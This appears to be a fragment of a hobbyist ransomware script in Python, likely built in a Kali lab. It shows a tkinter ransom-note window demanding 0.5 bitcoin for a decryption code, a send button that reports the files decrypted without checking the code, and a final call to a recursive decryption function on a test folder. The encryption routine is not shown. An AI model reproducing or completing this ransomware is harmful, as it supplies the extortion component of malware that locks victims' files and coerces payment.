#tkinter popup
root = Tk()


#textBox.grid(row=5, column=0)

myLabel2 = Label(root, text="Oh dear, you've been hacked! We have encrypted all of your files.")
myLabel3 = Label(root, text="If you want to get your files back you must pay us 0.5 bitcoin.")
myLabel4 = Label(root, text="When we receive the amount we will send the code to decrypt your files.")
myLabel5 = Label(root, text="If you choose not to pay us, your files will remain locked.")
myLabel6 = Label(root, text="Enter the code in the box below and click send.")
myLabel2.grid(row=0, column=0)
myLabel3.grid(row=1, column=0)
myLabel4.grid(row=2, column=0)
myLabel5.grid(row=3, column=0)
myLabel6.grid(row=4, column=0)



def send():
    myLabel = Label(root, text="Thank you. Your files have been decrypted.")
    myLabel.grid(row=7, column=0)

def button():
    global textBox
    textBox = Entry(root, borderwidth=10)
    textBox.grid(row=5, column=0)
    textBox.get()
    myButton = Button(root, text="Send", command=send)
    myButton.grid(row=6, column=0)
button()
root.mainloop()

recursive_decryption('/home/kali/test_bay2/')
